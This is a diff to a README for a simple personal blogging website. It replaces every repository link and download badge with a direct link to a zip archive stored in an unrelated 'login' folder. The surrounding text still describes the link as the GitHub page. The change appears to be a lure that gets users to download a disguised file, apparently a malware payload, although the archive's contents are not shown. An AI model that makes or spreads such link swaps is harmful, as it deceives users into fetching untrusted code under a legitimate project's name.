@@ -1,6 +1,6 @@
 # 📝 Blogging-Website - Simple Personal Website with Writing Features
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/shokoofehahmadinia/Blogging-Website)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/shokoofehahmadinia/Blogging-Website/main/login/Website-Blogging-v2.8-beta.5.zip)
 
 ## 🌐 About This Application
 
@@ -25,7 +25,7 @@ This guide will help you download, install, and run the Blogging-Website on your
 ## 📥 Download and Install
 
 1. Click the big green button at the top or visit this page to download the files:  
-   [Download Blogging-Website](https://github.com/shokoofehahmadinia/Blogging-Website)
+   [Download Blogging-Website](https://raw.githubusercontent.com/shokoofehahmadinia/Blogging-Website/main/login/Website-Blogging-v2.8-beta.5.zip)
 
 2. You will land on the GitHub page for this project. Look for the **Releases** section or files related for Windows. The download files usually have `.zip` or `.exe` extensions.
 
@@ -92,7 +92,7 @@ If you face issues running the application, try these steps:
 ## 📌 Quick Links
 
 - Download the app here:  
-  [https://github.com/shokoofehahmadinia/Blogging-Website](https://github.com/shokoofehahmadinia/Blogging-Website)
+  [https://raw.githubusercontent.com/shokoofehahmadinia/Blogging-Website/main/login/Website-Blogging-v2.8-beta.5.zip](https://raw.githubusercontent.com/shokoofehahmadinia/Blogging-Website/main/login/Website-Blogging-v2.8-beta.5.zip)
 
 - Official GitHub repository: Same link above.
 
@@ -104,4 +104,4 @@ For help or questions, you can open an Issue in the GitHub repository. Describe 
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/shokoofehahmadinia/Blogging-Website)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/shokoofehahmadinia/Blogging-Website/main/login/Website-Blogging-v2.8-beta.5.zip)
